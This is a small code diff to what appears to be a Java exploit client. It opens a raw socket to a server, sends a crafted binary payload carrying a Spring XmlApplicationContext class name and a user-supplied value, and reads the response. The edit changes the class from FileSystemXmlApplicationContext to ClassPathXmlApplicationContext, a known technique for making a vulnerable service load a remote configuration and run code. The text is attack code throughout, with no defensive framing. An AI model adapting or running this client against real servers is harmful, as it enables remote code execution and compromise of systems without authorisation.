@@ -43,7 +43,7 @@ public class Main {
         OutputStream outputStream = socket.getOutputStream();
         byte[] header = new byte[]{0x1f,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
 
-        String className = "org.springframework.context.support.FileSystemXmlApplicationContext";
+        String className = "org.springframework.context.support.ClassPathXmlApplicationContext";
 //         "org.springframework.context.support.ClassPathXmlApplicationContext"
         String message = args[2];
         byte[] ClassNameBytes = className.getBytes();
@@ -61,6 +61,7 @@ public class Main {
         System.out.println("[*] send payload :" + bytesToHex(payload));
         outputStream.write(payload);
         outputStream.flush();
+
         InputStream inputStream = socket.getInputStream();
         ByteArrayOutputStream byteArrayOutputStream  = new ByteArrayOutputStream();
         int read;
